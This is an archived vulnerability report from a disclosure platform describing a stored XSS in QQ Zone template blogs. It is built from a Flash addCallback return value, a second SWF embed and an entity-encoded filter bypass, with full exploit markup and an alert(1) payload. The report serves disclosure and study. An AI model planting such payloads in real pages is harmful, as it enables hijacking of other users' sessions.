@@ -1,0 +1,464 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间某功能缺陷导致日志存储型XSS - 14  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间某功能缺陷导致日志存储型XSS - 14  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2014-02-19 18:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-03-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-12：	细节向普通白帽子公开<br/>
+									2014-03-22：	细节向实习白帽子公开<br/>
+									2014-04-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">下定决心，不怕牺牲，排除万难，去争取胜利。<br />
+<br />
+为了找个XSS，鼠标都找坏了，单击变双击了。。。 T T 。。<br />
+<br />
+在本例中，可以看到一个FLASH是如何在同一个页面中被调用两次来完成两种不一样的鸡肋功能，最终导致XSS的。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 对于flash的addCallback与lso结合的案例，之前乌云已有不少案例了。<br />
+<br />
+<br />
+<br />
+但实际上，addCallback的返回值不一定是要从lso来读取，也可以是其它来源。<br />
+<br />
+<br />
+<br />
+不难假想以下存储型XSS的场景。<br />
+<br />
+<br />
+<br />
+用户--&gt;存储数据--&gt;数据被读取进入flash--&gt;数据进入addcallback返回值。<br />
+<br />
+<br />
+<br />
+2. 带着上面这个假想，对QQ空间日志功能中所使用的FLASH文件进行逐个排查，我们定位到了以下这个文件。<br />
+<br />
+<br />
+<br />
+http://edu.qzs.qq.com/qzone/app/blog/v6/swf/MusicPlayer.swf ，反编译后，可以看到以下两行代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalInterface.addCallback(this.setSoundFunName, this.__onSetSoundFunName);<br />
+ ExternalInterface.addCallback(this.getSoundFunName, this.__onGetSoundFunName);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+其中，我们可以注意 __onGetSoundFunName 函数的返回值类型是Object，如下所示：<br />
+<br />
+<br />
+<br />
+</p><pre><code>private function __onGetSoundFunName():Object{<br />
+            var _local2:String;<br />
+            var _local1:Object = this.musicPlayer.getSound();<br />
+            if (((!(!(_local1))) &amp;&amp; (!(!(_local1.url))))){<br />
+                _local2 = [_local1.url, _local1.song, _local1.singer, _local1.autoPlay].join(&quot;|&quot;);<br />
+            } else {<br />
+                _local2 = &quot;&quot;;<br />
+            };<br />
+            return (_local2);<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+返回值类型是OK的，那么这个返回值我们是否可以控制呢？ 根据以上代码，可以看到是 _local1.url, _local1.song ... singer 什么的，<br />
+<br />
+不用去跟踪代码，也大概能猜出，是歌曲地址，歌曲名称，歌手名称等，<br />
+<br />
+<br />
+<br />
+而我们在写模板日志，添加歌曲后，发送的请求中，有以下部分：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div name=&quot;music&quot; data=&quot;http://stream18.qqmusic.qq.com/31021594.mp3|歌名|歌手名|0&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+不难发现，这个data属性中的数据，正好对应 __onGetSoundFunName 函数返回值中的4个值。<br />
+<br />
+<br />
+<br />
+根据之前的知识，我们不难构造出利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>....<br />
+....<br />
+&lt;div name=&quot;music&quot; data=&quot;http://stream18.qqmusic.qq.com/31021594.mp3|aaaa\&amp;quot;;alert(1);//|AA|0&quot;&gt;<br />
+...<br />
+...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3. addCallback要能成功被利用，还有一个关键就是，页面必须调用 addCallback 所注册的函数，也就是说，<br />
+<br />
+<br />
+<br />
+如果FLASH中有一个callback<br />
+<br />
+</p><pre><code>ExternalInterface.addCallback(&quot;xxxx&quot;, this.__onGetSoundFunName);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么JS中必须调用一次 :<br />
+<br />
+<br />
+<br />
+</p><pre><code>document[&quot;flash ID&quot;].xxxx()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+才能导致XSS。<br />
+<br />
+<br />
+<br />
+在本例中，根据JS代码中的定义， getSoundFunName = getSound，即需要执行一次下面的代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>document[&quot;flash ID&quot;].getSound()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 为什么要强调这个呢？ 因为，在查看日志的时候，页面并不会执行 getSound函数， 这导致我们精心构造的addCallback xss无法被执行。查看了下代码，发现getSound函数，只有在编辑日志，点提交按钮的时候才会执行，<br />
+<br />
+<br />
+<br />
+编辑日志。。这。。。显然是自己X自己的节奏。。<br />
+<br />
+<br />
+<br />
+5. 那我们就这么放弃了吗？ 显然不是，我们得想办法让日志中，执行一次 document[&quot;flash ID&quot;].getSound()，方法呢？<br />
+<br />
+<br />
+<br />
+直接插入JS代码来执行这句？如果能直接插入JS，我们还用上面这么费力吗？不可取。<br />
+<br />
+<br />
+<br />
+事实告诉我们，鸡肋+鸡肋才是王道。<br />
+<br />
+<br />
+<br />
+这里我们还注意到：http://edu.qzs.qq.com/qzone/app/blog/v6/swf/MusicPlayer.swf 中还有下面的代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function flashInit():void{<br />
+            if (ExternalInterface.available){<br />
+                ExternalInterface.call(this.flashInitFunName);<br />
+            };<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+而 this.flashInitFunName 来自于 <br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalManager.instance.flashInitFunName = ((this.replaceNotAvaCha((_local2[&quot;flashInitFunName&quot;] as String))) || (ExternalManager.instance.flashInitFunName));</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+_local2 相当于 root.loaderInfo.parameters，即 flashInitFunName 来自于外部参数 flashInitFunName ，但传入后经过了replaceNotAvaCha函数的过滤。<br />
+<br />
+<br />
+<br />
+</p><pre><code>private function replaceNotAvaCha(_arg1:String):String{<br />
+            _arg1 = ((_arg1) || (&quot;&quot;));<br />
+            return (_arg1.replace(/[^a-zA-Z0-9_\.]/g, &quot;&quot;));<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+也就是说，flashInitFunName只允许 数字，字母，下划线和小数点，直接用这个参数来XSS是不行了，但是对于我们调用 document[&quot;flash ID&quot;].getSound() 的目的来说，却是完全足够了。<br />
+<br />
+<br />
+<br />
+这里 FLASH播放器的ID是  TemplateBlog_MusicPlayer12_flash<br />
+<br />
+<br />
+<br />
+那么我们要让FLASH执行 getSound ，需要在当前页面中再插入下面一个FLASH文件即可。<br />
+<br />
+<br />
+<br />
+http://edu.qzs.qq.com/qzone/app/blog/v6/swf/MusicPlayer.swf?flashInitFunName=document.TemplateBlog_MusicPlayer12_flash.getSound<br />
+<br />
+<br />
+<br />
+为了保证被插入的FLASH不被其它因素影响到JS的执行，我们将其它外部参数都补全。<br />
+<br />
+<br />
+<br />
+http://imgcache.qq.com/qzone/app/blog/v6/swf/MusicPlayer.swf?mode=view&amp;skinUrl=http://imgcache.qq.com/qzone/app/blog/v6/swf/Skin1.swf&amp;flashInitFunName=document.TemplateBlog_MusicPlayer12_flash.getSound&amp;soundPlayStateCallBackFunName=window.TemplateBlogMusicPlayer.soundPlayStateCallBack&amp;openSoundSelectCallBackFunName=window.TemplateBlogMusicPlayer.selectMusic&amp;setSoundFunName=setSound&amp;getSoundFunName=getSound&amp;statisticsFunName=window.TemplateBlogMusicPlayer.statistics<br />
+<br />
+<br />
+<br />
+6. 最后，我们就是要往日志中插入上面这个FLASH了。。但是显然这个步骤也是十分困难的。为什么困难呢？<br />
+<br />
+<br />
+<br />
+6.1 日志中是不允许随意插入指定URL的FLASH的<br />
+<br />
+<br />
+<br />
+6.2 模板日志中，会对日志的内容进行parse，parse之后，object标签会被无视掉，从而不会被输出到日志DOM中。<br />
+<br />
+<br />
+<br />
+7. 带着6的2个问题，我们一个一个来解决，首先是第一个问题：<br />
+<br />
+<br />
+<br />
+我们借助 QQ空间某功能缺陷导致日志存储型XSS - 13 （ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-048992">WooYun: QQ空间某功能缺陷导致日志存储型XSS - 13</a> ）中提到的技巧，将movie写为 mov&amp;#x69;e，即可绕过腾讯的限制，具体原理不在此贴再说一遍了。。。。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object  codeBase=&quot;http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;410&quot; height=&quot;100&quot; bgcolor=&quot;#ffffff&quot; menu=&quot;true&quot; allowScriptAccess=&quot;always&quot; name=&quot;musicFlash**&quot; class=&quot;blog_music&quot;&gt;<br />
+&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;<br />
+&lt;param name=&quot;mov&amp;#x69;e&quot; value=&quot;http://imgcache.qq.com/qzone/app/blog/v6/swf/MusicPlayer.swf?mode=view&amp;skinUrl=http://imgcache.qq.com/qzone/app/blog/v6/swf/Skin1.swf&amp;flashInitFunName=document.TemplateBlog_MusicPlayer12_flash.getSound&amp;soundPlayStateCallBackFunName=window.TemplateBlogMusicPlayer.soundPlayStateCallBack&amp;openSoundSelectCallBackFunName=window.TemplateBlogMusicPlayer.selectMusic&amp;setSoundFunName=setSound&amp;getSoundFunName=getSound&amp;statisticsFunName=window.TemplateBlogMusicPlayer.statistics&quot; /&gt;&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;<br />
+&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;data&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;<br />
+&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;<br />
+&lt;/object&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这样一来，我们可以在普通日志中插入这个FLASH了。<br />
+<br />
+<br />
+<br />
+8. 但是我们的场景是模板日志， 模板日志中会有以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>function _Callback(templateHtml,opt) {<br />
+	var reg = /&lt;div class=&quot;(blog_details_[\d]*?)&quot;&gt;[\s|\S]*&lt;\/div&gt;/ig;<br />
+	g_oBlogContent = g_oBlogContent.replace(reg,function($0,$1) {<br />
+		TemplateBlogParser.parseData(g_oBlogContent);				 <br />
+		var result = TemplateBlogParser.parse(templateHtml,opt);	 <br />
+		return &#039;&lt;div class=&quot;&#039; + $1 + &#039; blog_template&quot;&gt;&lt;div id=&quot;temp_container&quot; class=&quot;blog_template_cont&quot;&gt;&#039; + result.html + &quot;&lt;/div&gt;&lt;/div&gt;&quot;;<br />
+	});<br />
+	g_oContentDom.innerHTML = g_oBlogContent;<br />
+	TemplateBlogParser.start();<br />
+	_Callback = null;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+其中g_oBlogContent是原始日志内容，经过replace中的parseData之后，我们插入的object标签就会没了。<br />
+<br />
+<br />
+<br />
+为了解决这个问题，我们看看 TemplateBlogParser.parseData 函数<br />
+<br />
+<br />
+<br />
+</p><pre><code>parseData: function(content, opt) {<br />
+	opt = opt || {};<br />
+	var objectReg = /&lt;object[\s|\S]*?&lt;\/object&gt;/ig;<br />
+	TemplateBlogParser.temporaryData.objects = content.match(objectReg);<br />
+	TemplateBlogParser.titles = Title.parse(content);<br />
+	TemplateBlogParser.imgs = Pic.parse(content).concat(TemplateBlogParser.imgs);<br />
+	TemplateBlogParser.texts = Text.parse(content, opt);<br />
+	TemplateBlogParser.music = MusicPlayer.parse(content);<br />
+	TemplateBlogParser.multiImageData = MultiImageController.parse(content);<br />
+},</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+content参数被传入，继续查看其中的调用，当我们看到content进入 Title.parse后有希望:<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19184739d02bbb9db921c638338c826b58f03032.jpg" target="_blank"><img src="../images/19184739d02bbb9db921c638338c826b58f03032.jpg" alt="11111111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+由上图可见，&lt;div name=&quot;title&gt;xxxx&lt;/div&gt;之间的部分会被当作结果返回，这样一来，我们可以把我们的object标签放入<br />
+<br />
+<br />
+<br />
+&lt;div name=&quot;title&quot;&gt;&lt;object 标签&gt; ... &lt;/object&gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+最后&lt;object 标签&gt; ... &lt;/object&gt;将会当作内容返回，并输出到DOM中。<br />
+<br />
+<br />
+<br />
+9. 综上所述，同一个FLASH，被日志自带功能嵌入一次，执行setSound，插入我们恶意构造的XSS代码， 又被我们通过技巧嵌入一次，实现getSound的调用。 <br />
+<br />
+<br />
+<br />
+完整的利用代码如下：（发表模板日志时，html字段修改为以上内容，发表。效果见漏洞证明）<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div name=&quot;title&quot;&gt;&lt;object  codeBase=&quot;http://fpdownload.macromedia.com/get/flashplayer/current/swflash.cab#version=8,0,0,0&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;410&quot; height=&quot;100&quot; bgcolor=&quot;#ffffff&quot; menu=&quot;true&quot; allowScriptAccess=&quot;always&quot; name=&quot;musicFlash**&quot; class=&quot;blog_music&quot;&gt;<br />
+&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;<br />
+&lt;param name=&quot;mov&amp;#x69;e&quot; value=&quot;http://imgcache.qq.com/qzone/app/blog/v6/swf/MusicPlayer.swf?mode=view&amp;skinUrl=http://imgcache.qq.com/qzone/app/blog/v6/swf/Skin1.swf&amp;flashInitFunName=document.TemplateBlog_MusicPlayer12_flash.getSound&amp;soundPlayStateCallBackFunName=window.TemplateBlogMusicPlayer.soundPlayStateCallBack&amp;openSoundSelectCallBackFunName=window.TemplateBlogMusicPlayer.selectMusic&amp;setSoundFunName=setSound&amp;getSoundFunName=getSound&amp;statisticsFunName=window.TemplateBlogMusicPlayer.statistics&quot; /&gt;&lt;param name=&quot;bgColor&quot; value=&quot;#ffffff&quot; /&gt;<br />
+&lt;param name=&quot;movie&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;&lt;param name=&quot;data&quot; value=&quot;http://edu.qzs.qq.com/music/musicbox_v2_1/img/MusicFlash.swf&quot; /&gt;<br />
+&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&lt;param name=&quot;menu&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;<br />
+&lt;/object&gt;&lt;/div&gt;&lt;div name=&quot;title&quot;&gt;bbbbbb&lt;/div&gt;&lt;div name=&quot;text&quot; style=&quot;font-size:14px&quot;&gt;bbbbbbb&lt;/div&gt;&lt;img name=&quot;pic&quot; style=&quot;display:block;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;图片&quot; position=&quot;0_0&quot; isDefaultPhoto=&quot;1&quot; rotation=&quot;0&quot; scale=&quot;0&quot; src=&quot;http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_1.jpg&quot; /&gt;&lt;div name=&quot;title&quot;&gt;ccccc&lt;/div&gt;&lt;div name=&quot;text&quot; style=&quot;font-size:14px&quot;&gt;cccccc&lt;/div&gt;&lt;img name=&quot;pic&quot; style=&quot;display:block;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;图片&quot; position=&quot;0_0&quot; isDefaultPhoto=&quot;1&quot; rotation=&quot;0&quot; scale=&quot;0&quot; src=&quot;http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_2.jpg&quot; /&gt;&lt;div name=&quot;title&quot;&gt;ddddddd&lt;/div&gt;&lt;div name=&quot;text&quot; style=&quot;font-size:14px&quot;&gt;dddddd&lt;/div&gt;&lt;img name=&quot;pic&quot; style=&quot;display:block;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;图片&quot; position=&quot;0_0&quot; isDefaultPhoto=&quot;1&quot; rotation=&quot;0&quot; scale=&quot;0&quot; src=&quot;http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_3.jpg&quot; /&gt;&lt;div name=&quot;MultiImageController&quot; data=&quot;&quot;&gt;&lt;/div&gt;&lt;div name=&quot;music&quot; data=&quot;http://stream18.qqmusic.qq.com/31021594.mp3|aaaa\&amp;quot;;alert(1);//|AA|0&quot;&gt;&lt;object style=&quot;display:none&quot; ubb=&quot;http://stream18.qqmusic.qq.com/31021594.mp3|aaaa\&amp;quot;;alert(1);//|AA|0&quot; class=&quot;blog_music none&quot;&gt;&lt;/object&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+10. 当然，同上一篇 13 中一样，由于chrome下classid的问题，导致无法在chrome下执行，本例测试环境为 win7 + ie8 <br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">win7 + ie8<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1918480469c171f9edfb9319e79f6691acb8c827.png" target="_blank"><img src="../images/1918480469c171f9edfb9319e79f6691acb8c827.png" alt="222222.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">暂无修复建议。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051432" title="QQ空间某功能缺陷导致日志存储型XSS - 14">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-02-20 16:10</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51432";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
